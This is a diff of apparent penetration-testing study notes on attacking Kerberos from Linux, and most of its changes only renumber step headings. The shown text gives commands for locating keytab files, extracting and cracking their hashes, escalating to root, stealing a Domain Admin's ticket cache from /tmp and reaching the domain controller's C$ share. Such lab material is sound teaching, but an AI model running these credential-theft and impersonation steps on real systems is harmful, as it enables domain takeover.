@@ -4903,7 +4903,7 @@ find / -name *keytab* -ls 2>/dev/null
 <details>
 <summary><h5>Identifying KeyTab files in Cronjobs</h5></summary>
 
-**Identify KeyTab files in Cronjobs:**
+**Step 1: Identify KeyTab files in Cronjobs:**
 
 ```bash
 crontab -l
@@ -4916,7 +4916,7 @@ crontab -l
 # *5/ * * * * /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
 ```
 
-**Inspect script for KeyTab usage:**
+**Step 2: Inspect script for KeyTab usage:**
 
 ```bash
 cat /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
@@ -4990,7 +4990,7 @@ We can now impersonate the user with kinit.
 
 Before importing a new ticket via keytab, make a backup of the current credential cache file to avoid losing your existing Kerberos TGT.
 
-**1. Create the backup**
+**Create the backup**
 
 ```bash
 echo $KRB5CCNAME
@@ -5012,7 +5012,7 @@ A keytab file lists one or more Kerberos principals along with their encrypted s
 <details>
 <summary><h6>Option 1: Accessing Domain Shares via Impersonation</h6></summary>
 
-**Verify the current Kerberos ticket**
+**Step 1: Verify the current Kerberos ticket**
 
 ```bash
 klist
@@ -5033,13 +5033,13 @@ klist
 
 ---
 
-**Authenticate using the specified keytab, without entering a password.**
+**Step 2: Authenticate using the specified keytab, without entering a password.**
 
 ```bash
 kinit carlos@<DOMAIN> -k -t /opt/specialfiles/carlos.keytab
 ```
 
-**Confirm the change:**
+**Step 3: Confirm the change:**
 
 ```bash
 klist
@@ -5059,7 +5059,7 @@ klist
 
 ---
 
-**Connecting to SMB Share as Carlos:**
+**Step 4: Connecting to SMB Share as Carlos:**
 
 ```bash
 smbclient //dc01/carlos -k -c ls
@@ -5087,7 +5087,9 @@ We can use KeyTabExtract—a Python script—to extract data from version 0x502 
 * Encryption Types
 * Hashes (e.g. NTLM, AES-256, AES-128)
 
-**1. Use KeyTabExtract to extract the info:**
+---
+
+**Step 1: Use KeyTabExtract to extract the info**
 
 ```bash
 python3 ./keytabextract.py /opt/specialfiles/carlos.keytab 
@@ -5107,19 +5109,25 @@ python3 ./keytabextract.py /opt/specialfiles/carlos.keytab
 #         AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
 ```
 
+---
+
+**Step 2: Crack the password**
+
 With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.
 
 > **Note:** A KeyTab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
 
 The most straightforward hash to crack is the NTLM hash. We can use tools like Hashcat or John the Ripper to crack it. However, a quick way to decrypt passwords is with online repositories such as [crackstation](https://crackstation.net/), which contains billions of passwords.
 
-**2. Log in as the desired user:**
+---
+
+**Step 3: Log in as the desired user**
 
 ```bash
 su - carlos@<DOMAIN>
 ```
 
-**3. Obtain more hashes:**
+**Step 4: Obtain more hashes**
 
 The user has a cronjob that uses a KeyTab file named, for example, `svc_workstations.kt`. We can repeat the process, crack the password, and log in as svc_workstations.
 
@@ -5134,37 +5142,33 @@ To abuse a `.ccache` file, we only need read access. These files are typically s
 
 After logging in with the `svc_workstations` credentials, we can run `sudo -l` to verify that the user is allowed to execute any command as root. From there, we can escalate privileges by running `sudo su` to switch to the root user.
 
----
-
-**1. Connect to Target via SSH**
+**Step 1: Connect to Target**
 
 ```bash
 ssh svc_workstations@<DOMAIN>@<IP> -p <PORT_TO_FORWARD>
 ```
 
-**2. Check Sudo Permissions**
+**Step 2: Check Sudo Permissions**
 
 ```bash
 sudo -l
 ```
 
-**3. Elevate to Root User**
+**Step 3: Elevate to Root**
 
 ```bash
 sudo su
 ```
 
-**4. Confirm Current User**
+**Step 4: Verify Access**
 
 ```bash
 whoami
 ```
 
----
-
 As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
 
-**5. Confirm current user**
+**Step 5: Search `/tmp` Directory**
 
 ```bash
 ls -la /tmp
@@ -5188,7 +5192,7 @@ If there is an user to whom we have not yet gained access. We can confirm the gr
 
 ---
 
-**6. Identify group membership**
+**Step 6: Check Group Membership**
 
 ```bash
 id julio@<DOMAIN>
@@ -5202,35 +5206,16 @@ id julio@<DOMAIN>
 
 Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.
 
----
-
 To import the ccache file into our current session, we can copy the ccache file and assign the file path to the KRB5CCNAME variable.
 
-**1. List Kerberos Tickets:**
+**Step 7: Prepare Environment**
 
 ```bash
-klist
+cp /tmp/krb5cc_647401106_HRJDux .
+export KRB5CCNAME=$(pwd)/krb5cc_647401106_HRJDux
 ```
 
-**Expected Output:**
-
-```bash
-# klist: No credentials cache found (filename: /tmp/krb5cc_0)
-```
-
-**2. Copy Kerberos Ticket Cache File:**
-
-```bash
-cp /tmp/krb5cc_647401106_I8I133 .
-```
-
-**3. Set Kerberos Cache Environment Variable:**
-
-```bash
-export KRB5CCNAME=/root/krb5cc_647401106_I8I133
-```
-
-**4. List Kerberos Tickets:**
+**Step 8: Verify Ticket**
 
 ```bash
 klist
@@ -5247,7 +5232,9 @@ klist
 #         renew until 10/08/2025 13:25:01
 ```
 
-**5. Access SMB Share Using Kerberos Authentication:**
+> **Note:** Check "Valid starting" and "Expires" times
+
+**Step 9: Access Domain Resources**
 
 ```bash
 smbclient //dc01/C$ -k -c ls -no-pass
